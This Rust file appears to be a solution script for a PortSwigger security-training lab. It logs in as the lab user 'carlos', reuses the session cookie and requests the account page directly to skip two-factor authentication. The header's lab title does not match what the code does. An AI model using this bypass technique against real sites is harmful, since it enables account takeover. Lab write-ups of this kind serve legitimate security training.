/****************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 26/8/2023
*
* PortSwigger LAB: Username enumeration via different responses
*
* Steps: 1. Login as carlos
*        2. Extract the session from the Set-Cookie header
*        3. Request /login2 using the extracted session
*        4. Request /my-account directly bypassing 2FA
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;
fn main() {
    let url = "https://0aa7007704f85c4e83f0191a00ec00ce.web-security-academy.net"; // change this URL to your lab
    let client = build_client(); // build the client 
    let login = client
    .post(format!("{url}/login"))
    .form(&HashMap::from([
        ("username", "carlos"),
        ("password", "montoya"),
        ]))
        .send(); // try to login as as carlos
    if let Ok(res) = login { // if login in succeeded
        println!("{}", "1. Logged in as carlos.. ☑️".white().bold()); 
        let session = extract_session_cookie(&res.headers()); // extract session from cookie header
        let login2 = client
        .get(format!("{url}/login2"))
        .header("Cookie", format!("session={session}"))
        .send(); // try to GET /login2 page
    if let Ok(res2) = login2 { // if GET /login2 succeeded 
            println!("{}", "2. GET /login2 using extracted session.. ☑️".white().bold());
            let home = client
            .get(format!("{url}/my-account?id=carlos"))
            .header("Cookie", format!("session={session}"))
            .send(); // try to bypass the 2FA by requsting /my-account directrly
        if let Ok(home_res) = home { // if bypass succeeded
                println!("{}", "3. GET /my-account directly bypassing 2FA.. ☑️".white().bold());
                let body = home_res.text().unwrap();
                let carlos_name = extract_pattern("Your username is: (carlos)", &body); // search for name carlos in the body
                if carlos_name.len() != 0 { // check if the name exist
                    println!("{}", "✅ Logged in successfully as Carlos".green().bold());
                } else {
                    println!("{}", "Failed to login as Carlos".red().bold());
                }
            } else {
                println!("{}", "Couldn't get login2 page".red().bold());
            }
        } else {
            println!("{}", "Couldn't get login2 page".red().bold());
        }
    } else {
        println!("{}", "Login failed".red().bold());
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************************************
* Reusable Function to extract session field from the cookie header
********************************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/****************************************************
* Reusable function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
